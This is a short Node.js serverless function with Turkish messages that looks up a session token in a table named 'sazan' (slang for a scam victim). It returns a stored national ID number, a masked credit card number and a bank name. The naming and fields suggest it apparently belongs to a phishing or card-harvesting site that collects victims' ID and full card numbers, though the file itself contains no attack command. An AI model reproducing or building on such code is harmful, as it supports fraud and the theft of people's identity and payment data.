const { query } = require('../../lib/db');
const { getSessionToken } = require('../../lib/session');

exports.handler = async function handler(event) {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: JSON.stringify({ message: 'Yalnızca GET desteklenir.' }) };
  }

  try {
    const sessionToken = getSessionToken(event.headers);
    if (!sessionToken) {
      return { statusCode: 200, body: JSON.stringify({ active: false }) };
    }

    const result = await query(
      'SELECT tc, kk, now, banka FROM sazan WHERE session_token = $1 LIMIT 1',
      [sessionToken],
    );

    if (!result.rowCount) {
      return { statusCode: 200, body: JSON.stringify({ active: false }) };
    }

    const record = result.rows[0];
    const maskedCard = record.kk ? `•••• •••• •••• ${record.kk.slice(-4)}` : null;

    return {
      statusCode: 200,
      body: JSON.stringify({
        active: true,
        tc: record.tc,
        card: maskedCard,
        now: record.now,
        banka: record.banka,
      }),
    };
  } catch (error) {
    console.error('session-info hatası:', error);
    return { statusCode: 500, body: JSON.stringify({ active: false }) };
  }
};